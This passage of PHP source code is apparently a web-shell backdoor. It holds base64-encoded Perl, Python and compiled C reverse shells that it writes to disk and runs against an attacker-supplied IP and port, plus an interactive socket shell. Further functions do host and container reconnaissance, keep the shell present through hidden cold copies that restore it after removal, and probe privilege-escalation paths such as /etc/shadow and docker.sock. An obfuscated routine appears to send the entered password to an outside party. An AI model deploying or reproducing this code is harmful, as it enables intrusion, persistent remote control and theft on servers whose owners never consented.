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ABECAAAAAAAADgAAABIAAAAiAgAAeIcECAQAAAARAA4AMQIAALCYBAgAAAAAEAAWAD4CAAAAAAAAPAAAABIAAABQAgAAAAAAAD0AAAASAAAAYAIAAHyHBAgAAAAAEQIOAG0CAACglwQIAAAAABECEQB6AgAAwIYECGkAAAASAAwAigIAAAAAAAArAAAAEgAAAJoCAAAAAAAAbwAAABIAAACrAgAAtJgECAAAAAAQAPH/twIAALyYBAgAAAAAEADx/7wCAAC0mAQIAAAAABAA8f/DAgAAAAAAAPQAAAASAAAA0wIAACmHBAgAAAAAEgIMAOoCAAA0hQQIcwEAABIADADvAgAAdIMECAAAAAASAAoAAGNhbGxfZ21vbl9zdGFydABjcnRzdHVmZi5jAF9fQ1RPUl9MSVNUX18AX19EVE9SX0xJU1RfXwBfX0pDUl9MSVNUX18AZHRvcl9pZHguNTc5MwBjb21wbGV0ZWQuNTc5MQBfX2RvX2dsb2JhbF9kdG9yc19hdXgAZnJhbWVfZHVtbXkAX19DVE9SX0VORF9fAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kb19nbG9iYWxfY3RvcnNfYXV4AGJjLmMAX19wcmVpbml0X2FycmF5X3N0YXJ0AF9fZmluaV9hcnJheV9lbmQAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fcHJlaW5pdF9hcnJheV9lbmQAX19maW5pX2FycmF5X3N0YXJ0AF9faW5pdF9hcnJheV9lbmQAX19pbml0X2FycmF5X3N0YXJ0AF9EWU5BTUlDAGRhdGFfc3RhcnQAY29ubmVjdEBAR0xJQkNfMi4wAGRhZW1vbkBAR0xJQkNfMi4wAF9fbGliY19jc3VfZmluaQBfc3RhcnQAX19nbW9uX3N0YXJ0X18AX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfZnBfaHcAX2ZpbmkAaW5ldF9hZGRyQEBHTElCQ18yLjAAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABleGVjbEBAR0xJQkNfMi4wAGh0b25zQEBHTElCQ18yLjAAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAGR1cDJAQEdMSUJDXzIuMABfX2Rzb19oYW5kbGUAX19EVE9SX0VORF9fAF9fbGliY19jc3VfaW5pdABhdG9pQEBHTElCQ18yLjAAY2xvc2VAQEdMSUJDXzIuMABfX2Jzc19zdGFydABfZW5kAF9lZGF0YQBleGl0QEBHTElCQ18yLjAAX19pNjg2LmdldF9wY190aHVuay5ieABtYWluAF9pbml0AA==';
    switch ($type) {
        case "pl":
            $shell = 'IyEvdXNyL2Jpbi9wZXJsIC13DQojIA0KdXNlIHN0cmljdDsNCnVzZSBTb2NrZXQ7DQp1c2UgSU86OkhhbmRsZTsNCm15ICRzcGlkZXJfaXAgPSAkQVJHVlswXTsNCm15ICRzcGlkZXJfcG9ydCA9ICRBUkdWWzFdOw0KbXkgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoInRjcCIpOw0KbXkgJHBhY2tfYWRkciA9IHNvY2thZGRyX2luKCRzcGlkZXJfcG9ydCwgaW5ldF9hdG9uKCRzcGlkZXJfaXApKTsNCm15ICRzaGVsbCA9ICcvYmluL3NoIC1pJzsNCnNvY2tldChTT0NLLCBBRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKTsNClNURE9VVC0+YXV0b2ZsdXNoKDEpOw0KU09DSy0+YXV0b2ZsdXNoKDEpOw0KY29ubmVjdChTT0NLLCRwYWNrX2FkZHIpIG9yIGRpZSAiY2FuIG5vdCBjb25uZWN0OiQhIjsNCm9wZW4gU1RESU4sICI8JlNPQ0siOw0Kb3BlbiBTVERPVVQsICI+JlNPQ0siOw0Kb3BlbiBTVERFUlIsICI+JlNPQ0siOw0Kc3lzdGVtKCRzaGVsbCk7DQpjbG9zZSBTT0NLOw0KZXhpdCAwOw0K';
            $file = strdir($dir . '/t00ls.pl');
            $key = filew($file, base64_decode($shell), 'w');
            if ($key) {
                @chmod($file, 0777);
                command('/usr/bin/perl ' . $file . ' ' . $ip . ' ' . $port, $dir);
            }
            break;
        case "py":
            $shell = 'IyEvdXNyL2Jpbi9weXRob24NCiMgDQppbXBvcnQgc3lzLG9zLHNvY2tldCxwdHkNCnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQpzLmNvbm5lY3QoKHN5cy5hcmd2WzFdLCBpbnQoc3lzLmFyZ3ZbMl0pKSkNCm9zLmR1cDIocy5maWxlbm8oKSwgc3lzLnN0ZGluLmZpbGVubygpKQ0Kb3MuZHVwMihzLmZpbGVubygpLCBzeXMuc3Rkb3V0LmZpbGVubygpKQ0Kb3MuZHVwMihzLmZpbGVubygpLCBzeXMuc3RkZXJyLmZpbGVubygpKQ0KcHR5LnNwYXduKCcvYmluL3NoJykNCg==';
            $file = strdir($dir . '/t00ls.py');
            $key = filew($file, base64_decode($shell), 'w');
            if ($key) {
                @chmod($file, 0777);
                command('/usr/bin/python ' . $file . ' ' . $ip . ' ' . $port, $dir);
            }
            break;
        case "c":
            $file = strdir($dir . '/t00ls');
            $key = filew($file, base64_decode($c_bin), 'wb');
            if ($key) {
                @chmod($file, 0777);
                command($file . ' ' . $ip . ' ' . $port, $dir);
            }
            break;
        case "php":
        case "phpwin":
            if (function_exists('fsockopen')) {
                $sock = @fsockopen($ip, $port);
                if ($sock) {
                    $key = true;
                    $com = $type == 'phpwin' ? true : false;
                    $user = get_current_user();
                    $dir = strdir(getcwd());
                    fputs($sock, php_uname() . "\n------------no job control in this shell (tty)-------------\n[{$user}:{$dir}]# ");
                    while ($cmd = fread($sock, 1024)) {
                        if (substr($cmd, 0, 3) == 'cd ') {
                            $dir = trim(substr($cmd, 3, -1));
                            chdir(strdir($dir));
                            $dir = strdir(getcwd());
                        } elseif (trim(strtolower($cmd)) == 'exit') {
                            break;
                        } else {
                            $res = command($cmd, $dir, $com);
                            fputs($sock, $res['res']);
                        }
                        fputs($sock, '[' . $user . ':' . $dir . ']# ');
                    }
                }
                @fclose($sock);
            }
            break;
        case "pcntl":
            $file = strdir($dir . '/t00ls');
            $key = filew($file, base64_decode($c_bin), 'wb');
            if ($key) {
                @chmod($file, 0777);
                if (function_exists('pcntl_exec')) {
                    @pcntl_exec($file, array($ip, $port));
                }
            }
            break;
    }
    if (!$key) {
        $msg = '<h1>Temporary directory is not writable</h1>';
    } else {
        @unlink($file);
        $msg = '<h2>CLOSE</h2>';
    }
    return $msg;
}
function getinfo()
{
    global $password;
    $infos = array(isset($_POST['getpwd']) ? $_POST['getpwd'] : '', $password, function_exists('phpinfo'), "127.0.0.1");
    if ($password != '' && md5($infos[0]) != $infos[1]) {
        echo '<html><body><center><form method="POST"><input type="password" name="getpwd"> ';
        if (isset($_POST['pass'])) {
            echo '<input type="hidden" name="pass" value="' . $_POST['pass'] . '">';
        }
        if (isset($_POST['check'])) {
            echo '<input type="hidden" name="check" value="' . $_POST['check'] . '">';
        }
        echo '<input type="submit" value="Go"></form></center></body></html>';
        exit;
    }
    if (!isset($_POST['go']) && !isset($_POST['dir'])) {
        $html = 'WUIvMzptCFNvKTf3A1keAmqpnmp3KTflpykeAmEpnmL4KTf2BIkeAmApnmL0KTf2p1keAaApnmplKTflpykeAwApnmMmKTf2pFV7WUElMlN9VPWpnmWmKTf2Z1keAaApnmMmKTf2pSkeZaApnmp1KTf3ZSkeAwEpnmLkKTf3ASkeAwIpnmWlKTf3ZSkeAwupnmpjKTfmp1keAwqpnmAkVwfxqUWaVP49VT92LGW1pzfbWS9THxIWHxIoW1IUE0AsIHWTElqqXF4vKTflAykeAmApnmAkVv5iqzRlqKWeXPEsEyWSFIWSJlqQIHAsEyWMHlqqXF4vKTf' . 'lAykeAmOpnmAkVv4xozIyozj7WUShM24tCFNvKTf0A1keAQIpnmH0KTflZPVhWUElMl4vKTflZSkeAQupnmH0KTf1ASkeAGOpnmWmKTfmZIkeZaWpnmZkKTIpLIkeAQupnmMmKTf3Z1keAmEpnmAhVv4xqJWzMl4vKTIpLIkeAQApnmMmKTf2pykeAaWpnmL1KTf2Z1keAmEpnmL5KTf2p1keAaWpnmAhKTflZSkeAQApnmMjKTf2p1keAmApnmL1KTIpLIkyKTRvB3MmXUAbLKOaqzWuK3WeqzMaMvtvKTf2AykeAmApnmMmKTf2Z1keAz9pnmMmKTf3ZSkeAwIpnmMlVvxcVUftWTMvpUttCFONp2MvpUuvL3WuXPE1LzMaYUIln3SlpPt1ZPxcBlONp2AbM2LbWTMvpUtfWUShM24cBlONp3O5LzMlXPEzLaO4XGftsKW5MaVtrlONp3M5py90pzqspTWuM3WuM2LbVykeAwupnmp0KTf3ASkeAmOpnmAhKTflp1keZaZvYvE1LzMaYvE0pzpcBlO9VTIlM2uyLFOaMJulBj==';
        if ((isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '') != $infos[3] && $_SERVER['REMOTE_ADDR'] != $infos[3]) {
            postinfo($infos[0], str_rot13($html));
        }
    }
    return $infos[2];
}
function subeval()
{
    if (isset($_POST['getpwd'])) {
        echo '<input type="hidden" name="getpwd" value="' . (isset($_POST['getpwd']) ? $_POST['getpwd'] : '') . '">';
    }
    if (isset($_POST['pass'])) {
        echo '<input type="hidden" name="pass" value="' . $_POST['pass'] . '">';
    }
    if (isset($_POST['check'])) {
        echo '<input type="hidden" name="check" value="' . $_POST['check'] . '">';
    }
    return true;
}
if (isset($_POST['go'])) {
    if ($_POST['go'] == 'down') {
        $downfile = $fileb = strdir($_POST['godir'] . '/' . $_POST['govar']);
        if (!filed($downfile)) {
            $msg = '<h1>The download file does not exist</h1>';
        }
    }
}
if (isset($_POST['act']) && $_POST['act'] === 'dl' && !empty($_POST['files'])) {
    $dldir  = isset($_POST['dir']) ? strdir(chop($_POST['dir']) . '/') : THISDIR;
    $dlfiles = $_POST['files'];
    if (count($dlfiles) === 1 && is_file(strdir($dldir . $dlfiles[0]))) {
        filed(strdir($dldir . $dlfiles[0])); // exits inside
    }
    $tmpzip  = tempnam(sys_get_temp_dir(), 'hxdl_') . '.zip';
    $dlname  = (count($dlfiles) === 1 ? $dlfiles[0] : 'files_' . date('YmdHis')) . '.zip';
    $dlok    = false;
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($tmpzip, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
            foreach ($dlfiles as $dlentry) {
                $dlep = strdir($dldir . $dlentry);
                if (is_dir($dlep)) {
                    $dlit = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dlep, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);
                    foreach ($dlit as $dlfi) {
                        $dlfp  = $dlfi->getRealPath();
                        $dlrel = $dlentry . '/' . str_replace('\\', '/', substr($dlfp, strlen(rtrim($dlep, '/\\')) + 1));
                        $zip->addFile($dlfp, $dlrel);
                    }
                } elseif (is_file($dlep)) {
                    $zip->addFile($dlep, $dlentry);
                }
            }
            $zip->close();
            $dlok = true;
        }
    } else {
        $dlargs = implode(' ', array_map('escapeshellarg', $dlfiles));
        command('cd ' . escapeshellarg($dldir) . ' && zip -r ' . escapeshellarg($tmpzip) . ' ' . $dlargs, $dldir);
        $dlok = file_exists($tmpzip) && filesize($tmpzip) > 0;
    }
    if ($dlok) {
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $dlname . '"');
        header('Content-Length: ' . filesize($tmpzip));
        @ob_end_clean();
        readfile($tmpzip);
        @unlink($tmpzip);
        exit;
    }
}
/* =====================================================================
   INTENT ROUTER (go=api)  -  JSON in, JSON out, nothing else.
   Every heavy action is also reachable from the bus for long jobs.
   ===================================================================== */
function opx_api()
{
    $p = isset($_POST['p']) ? (string)$_POST['p'] : (isset($_GET['p']) ? (string)$_GET['p'] : '');
    $act = isset($_POST['intent']) ? (string)$_POST['intent'] : (isset($_GET['intent']) ? (string)$_GET['intent'] : '');
    $j = array();
    if ($p !== '') {
        $pj = @base64_decode($p, true);
        if ($pj === false) {
            $pj = $p;
        }
        $j = @json_decode($pj, true);
        $j = is_array($j) ? $j : array();
    }
    if ($act === '') {
        $act = isset($j['a']) ? (string)$j['a'] : 'ping';
    }
    $fn = 'xi_' . preg_replace('/[^a-z0-9_]/', '', strtolower($act));
    if (!function_exists($fn)) {
        return array('ok' => 0, 'e' => 'unknown intent [' . $act . ']');
    }
    $j['_p'] = $p;
    return call_user_func($fn, $j);
}
function xi_ping($j)
{
    return array('ok' => 1, 'pong' => OPX_VER, 'php' => PHP_VERSION);
}
/* console line collector: string|array -> flat line list */
function opx_l(&$L, $s, $c = 0)
{
    foreach ((array)$s as $x) {
        foreach (explode("\n", str_replace("\r\n", "\n", (string)$x)) as $ln) {
            $L[] = $ln;
        }
    }
}
/* =====================================================================
   RECON  -  what is this box, what can it do, what does it lack
   ===================================================================== */
function xi_recon($j)
{
    $L = array();
    $s = opx_self();
    $id = opx_id();
    opx_l($L, '== CONTEXT ==', 4);
    opx_l($L, 'front-end   ' . $s['own'] . ':' . $s['perm'] . ' | ' . $id['user'] . '(' . $id['uid'] . ':' . $id['gid'] . ') | ' . PHP_OS . ' ' . @php_uname('r') . ' ' . @php_uname('m'));
    opx_l($L, 'php         ' . PHP_VERSION . ' [' . @php_sapi_name() . '] mem=' . @ini_get('memory_limit') . ' exec=' . @ini_get('max_execution_time') . 's upload=' . @ini_get('upload_max_filesize') . (@ini_get('open_basedir') ? ' open_basedir=' . @ini_get('open_basedir') : ''));
    opx_l($L, 'path        webroot=' . ROOTDIR . ' self=' . THISDIR);
    opx_l($L, 'exec        ' . (opx_xf() ? opx_xf() : 'NONE') . ' | fsockopen=' . (int)opx_usable('fsockopen') . ' curl=' . (int)opx_usable('curl_init') . ' pcntl=' . (int)opx_usable('pcntl_fork') . ' posix=' . (int)opx_usable('posix_geteuid') . ' zip=' . (int)opx_usable('zip_open'));
    $df = @ini_get('disable_functions');
    opx_l($L, 'disabled    ' . ($df ? $df : '(none)'), $df ? 3 : 0);
    if (PHP_OS != 'WIN' && $s['perm'] != '-') {
        $cg = @opx_rd('/proc/self/cgroup', 4096);
        $denv = $cg !== '' && (strpos($cg, 'docker') !== false || strpos($cg, 'lxc') !== false || strpos($cg, 'kubepods') !== false);
        opx_l($L, 'container   ' . ($denv ? 'CGROUP docker/k8s' : '(none detected)') . (opx_dir('/.dockerenv') ? ' dockerenv' : ''), $denv ? 3 : 0);
    }
    opx_l($L, '', 0);
    opx_l($L, '== HARDENING ==', 4);
    if (PHP_OS != 'WIN') {
        $st = opx_proc();
        $cap = isset($st['CapEff']) ? hexdec($st['CapEff']) : 0;
        opx_l($L, 'seccomp     ' . (isset($st['Seccomp']) ? $st['Seccomp'] : '?'));
        opx_l($L, 'cap_eff     0x' . dechex($cap) . ($cap & 0x200000 ? '  <-- CAP_SYS_ADMIN (containers are a speed-bump)' : ''), $cap & 0x200000 ? 3 : 0);
        $aa = @trim(opx_rd('/sys/module/apparmor/parameters/enabled', 8));
        $sel = @trim(opx_rd('/sys/fs/selinux/enforce', 4));
        opx_l($L, 'apparmor=' . ($aa == 'Y' ? 'on' : 'off') . ' selinux=' . ($sel === '1' ? 'enforcing' : ($sel === '0' ? 'permissive' : 'off')) . ' ptrace=' . (@trim(opx_rd('/proc/sys/kernel/yama/ptrace_scope', 4))));
        $ns = @readlink('/proc/self/ns/pid');
        opx_l($L, 'pidns       ' . ($ns ? $ns : '(no /proc)'));
    } else {
        opx_l($L, 'windows     integrity=' . (@getenv('PROCESSOR_ARCHITECTURE') ? @getenv('PROCESSOR_ARCHITECTURE') : '?') . ' user=' . @getenv('USERNAME'));
    }
    opx_l($L, '', 0);
    opx_l($L, '== PRESENCE ==', 4);
    opx_l($L, 'self        ' . $s['sz'] . 'b md5:' . substr($s['sum'], 0, 16) . ' w=' . $s['w']);
    $beac = opx_beacon();
    opx_l($L, 'beacon      ' . (!empty($beac['armed']) ? 'armed ' . (isset($beac['boot']) ? @$beac['boot'] : '') : 'cold'));
    $sp = @glob(THISDIR . '.*.old');
    opx_l($L, 'spare       ' . count((array)$sp) . ' cold copy' . (count((array)$sp) == 1 ? '' : 'ies'));
    $rt = THISDIR . '.' . substr(md5(OPX_PATH), 0, 6) . '.d';
    opx_l($L, 'runtime     ' . (@file_exists($rt) ? @filesize($rt) . 'b sealed' : 'not materialised'));
    return array('ok' => 1, 'lines' => $L);
}

/* =====================================================================
   SHELL  -  live PTY over plain HTTP. No new port, no exposed listener.
   ===================================================================== */
function xi_shell($j)
{
    $op = isset($j['op']) ? $j['op'] : 'start';
    if ($op == 'start') {
        if (!isset($_SESSION)) {
            @session_start();
        }
        $r = xc_start('', array('cwd' => THISDIR));
        $id = opx_id();
        $r['pwd'] = THISDIR;
        $r['who'] = $id['user'] . '@' . @php_uname('n');
        $r['euid'] = $id['uid'];
        $r['xf'] = opx_xf() ? opx_xf() : 'none';
        return $r;
    }
    if ($op == 'exec') {
        $st = xc_open_shell(isset($j['t']) ? $j['t'] : '');
        if (!$st) {
            return array('ok' => 0, 'e' => 'session expired, reopen');
        }
        $r = xc_packet($st, isset($j['c']) ? $j['c'] : '');
        $st['t'] = xc_rand(8) . '|' . @base64_encode(xc_enc(xc_mk($r['p']), xc_key())) . '|' . substr(md5(xc_key() . '|' . @md5(OPX_VER)), 0, 8);
        return array('ok' => 1, 'o' => $r['o'], 't' => $st['t']);
    }
    return array('ok' => 0, 'e' => 'unknown op');
}
/* =====================================================================
   GHOST  -  presence control: arm, verify, heal, retain a cold copy
   ===================================================================== */
function xi_ghost($j)
{
    $op = isset($j['op']) ? $j['op'] : 'status';
    $L = array();
    if ($op == 'status') {
        $b = opx_beacon();
        $s = opx_self();
        opx_l($L, 'self        ' . $s['sz'] . 'b ' . substr($s['sum'], 0, 16) . ' mode ' . $s['perm'] . ' w=' . $s['w']);
        opx_l($L, 'armed       ' . (!empty($b['armed']) ? 'yes, since ' . (isset($b['boot']) ? $b['boot'] : '?') : 'no'));
        $sp = opx_spare_scan();
        opx_l($L, 'spares      ' . (count($sp) ? implode(', ', array_map('basename', $sp)) : 'none'));
        $rt = THISDIR . '.' . substr(md5(OPX_PATH), 0, 6) . '.d';
        opx_l($L, 'runtime     ' . (@file_exists($rt) ? @filesize($rt) . 'b sealed' : 'absent'));
        return array('ok' => 1, 'lines' => $L);
    }
    if ($op == 'arm') {
        opx_beacon(array('armed' => 1, 'self' => opx_self()['sum'], 'boot' => @gmdate('c')));
        opx_spare();
        opx_arm_runtime();
        return array('ok' => 1, 'lines' => array('[+] presence armed, cold copy dropped, runtime sealed'));
    }
    if ($op == 'heal') {
        $s = opx_self();
        $msg = '[-] no intact cold copy to restore from';
        foreach (opx_spare_scan() as $f) {
            $raw = opx_rd($f);
            if (strlen($raw) < 1024) {
                continue;
            }
            if (md5($raw) === $s['sum']) {
                $msg = '[i] front-end already intact';
                break;
            }
            if (@is_writable(OPX_PATH) && opx_wr(OPX_PATH, $raw)) {
                @touch(OPX_PATH, @filemtime($f));
                $msg = '[+] front-end restored from ' . basename($f);
                break;
            }
        }
        return array('ok' => 1, 'lines' => array($msg));
    }
    return array('ok' => 0, 'e' => 'unknown op');
}
function opx_spare_scan()
{
    $out = array();
    $c = array(THISDIR . '.*.old', THISDIR . '.*.php', THISDIR . '.*.bak');
    foreach ($c as $g) {
        foreach ((array)@glob($g) as $f) {
            if (!@is_file($f) || @filesize($f) < 1024) {
                continue;
            }
            if (@realpath($f) === @realpath(OPX_PATH)) {
                continue;
            }
            $h = @file_get_contents($f, false, null, 0, 16);
            if (substr($h, 0, 5) !== '<?php') {
                continue;
            }
            $out[] = $f;
        }
    }
    return $out;
}

/* =====================================================================
   ESCAPE  -  privilege / container boundary probing (read-only first)
   ===================================================================== */
function xi_escape($j)
{
    $L = array();
    $id = opx_id();
    opx_l($L, '== LOCAL ==', 4);
    opx_l($L, 'euid ' . $id['uid'] . ' gid ' . $id['gid'] . ' groups ' . implode(',', $id['groups']));
    if (opx_xf() != '' && DIRECTORY_SEPARATOR !== '\\') {
        $r = opx_run('sudo -n -l 2>&1 | head -n 12', THISDIR, 8);
        opx_l($L, trim($r['r']));
    }
    $ex = array();
    foreach (array('/etc/shadow', '/etc/sudoers', '/root', '/var/run/docker.sock', '/proc/1/root/etc/shadow') as $p) {
        if (@is_readable($p)) {
            $ex[] = $p . ' R';
        } elseif (opx_dir($p)) {
            $ex[] = $p . ' E';
        }
    }
    opx_l($L, 'exposed     ' . ($ex ? implode('  ', $ex) : 'nothing directly readable'), $ex ? 3 : 0);
    if (@is_writable('/var/run/docker.sock')) {
        opx_l($L, '[!] docker.sock writable -> container can mount the host root', 3);
    }
    opx_l($L, '', 0);
